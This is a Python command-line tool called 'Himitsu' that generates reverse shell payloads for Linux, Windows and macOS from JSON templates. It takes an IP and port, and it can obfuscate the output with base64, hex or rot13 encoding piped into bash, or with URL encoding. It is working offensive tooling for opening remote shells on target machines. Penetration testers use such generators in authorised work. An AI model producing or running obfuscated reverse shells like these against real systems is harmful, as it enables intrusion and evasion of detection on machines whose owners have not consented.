#!/usr/bin/env python3

import os
import argparse
import base64
import sys
import ipaddress
import urllib.parse
import json
import random
import string
import codecs

banner = r"""
  ___ ___ .__        .__  __
 /   |   \|__| _____ |__|/  |_  ________ __
/    ~    \  |/     \|  \   __\/  ___/  |  \
\    Y    /  |  Y Y  \  ||  |  \___ \|  |  /
 \___|_  /|__|__|_|  /__||__| /____  >____/
       \/          \/              \/
                                      ~A1SBERG
"""

def load_payloads():
    with open('payloads.json', 'r') as f:
        return json.load(f)

def load_pty_shells():
    with open('pty_shells.json', 'r') as f:
        return json.load(f)

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def is_valid_port(port):
    return 0 <= port <= 65535

def list_reverse_shells(os_category):
    payloads = load_payloads()
    if os_category in payloads:
        print(f"Available reverse shell types for {os_category.capitalize()}:")
        for shell_type in payloads[os_category]:
            print(f"- {shell_type}")
    else:
        print(f"[-] Invalid OS category: {os_category}")

def list_pty_shells():
    pty_shells = load_pty_shells()
    print(f"Available pty shell types:")
    for pty_shell in pty_shells:
        print(f"- {pty_shell}")

def generate_reverse_shells(ip, port, os_category, shell_type, encode, payloads):
    if not is_valid_ip(ip):
        print(f"[-] Invalid IP address: {ip}")
        return
    if port is None or not is_valid_port(port):
        print(f"[-] Invalid port number: {port}. It should be between 0 and 65535.")
        return
    if os_category in payloads and shell_type in payloads[os_category]:
        shell_command = payloads[os_category][shell_type].format(ip, port)
        if encode == 'base64':
            shell_command = base64.b64encode(shell_command.encode()).decode()
            shell_command = f"echo {shell_command} | base64 -d | bash"
        elif encode == 'hex':
            shell_command = shell_command.encode().hex()
            shell_command = f"echo {shell_command} | xxd -r -p | bash"
        elif encode == 'rot13':
            shell_command = codecs.encode(shell_command, 'rot_13')
            shell_command = f"echo '{shell_command}' | rot13 | bash"
        elif encode == 'url':
            shell_command = urllib.parse.quote(shell_command)
        else:
            encode = 'None'
        print("[+] Payload Generated:")
        print("-" * 40)
        print(f" IP Address     : {ip}")
        print(f" Port           : {port}")
        print(f" OS Category    : {os_category.capitalize()}")
        print(f" Shell Type     : {shell_type}")
        print(f" Encoding       : {encode.capitalize()}")
        print("-" * 40)
        print(f"{shell_command}")
        print("-" * 40)
    else:
        print(f"[-] Invalid OS category or shell type: {os_category} - {shell_type}")

def generate_pty_shells(shell_type, pty_shells):
    if shell_type in pty_shells and shell_type in pty_shells:
        pty_shell = pty_shells[shell_type]
        print("[+] Pty Shell Generated:")
        print("-" * 40)
        print(f" Shell Type     : {shell_type}")
        print("-" * 40)
        print(f"{pty_shell}")
        print("-" * 40)
    else:
        print(f"[-] Invalid Shell Type: {shell_type}")

def main():
    payloads = load_payloads()
    pty_shells = load_pty_shells()

    print(banner)

    parser = argparse.ArgumentParser(description="Himitsu: Reverse Shell Generator for Lazy.")
    parser.add_argument('-ip', '--ipaddress', type=str, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, help='Target port number')
    parser.add_argument('-os', '--operating-system', type=str, help='Target operating system (linux, windows, macos)')
    parser.add_argument('-pl', '--payload', type=str, help='Payload for reverse shell')
    parser.add_argument('-pty', '--pty-shell', type=str, help='Generate PTY shell')
    parser.add_argument('-rlist', '--revlist', type=str, help='List available reverse shell payload types for the specified OS')
    parser.add_argument('-plist', '--ptylist', action='store_true', help='List all the available PTY shell types')
    parser.add_argument('-enc', '--encode', type=str, help='Encode the payload in Base64, URL, or other formats')

    args = parser.parse_args()

    if args.revlist:
        list_reverse_shells(args.revlist.lower())
        return

    if args.ptylist:
        list_pty_shells()
        return

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    # Check for conflicting arguments (pty with reverse shell arguments)
    if args.pty_shell:
        if args.ipaddress or args.port or args.operating_system or args.payload or args.encode:
            print("[-] PTY shell argument is not allowed with other options.")
            sys.exit(1)
        generate_pty_shells(args.pty_shell, pty_shells)
        return

    # Check for missing arguments when generating reverse shells
    if args.ipaddress and args.port and args.operating_system and args.payload:
        generate_reverse_shells(
            ip=args.ipaddress, 
            port=args.port, 
            os_category=args.operating_system, 
            shell_type=args.payload, 
            encode=args.encode, 
            payloads=payloads
        )
    else:
        print("[-] Missing required arguments. Please specify the IP address, port, operating system, and payload.")
        sys.exit(1)


if __name__ == '__main__':
    main()

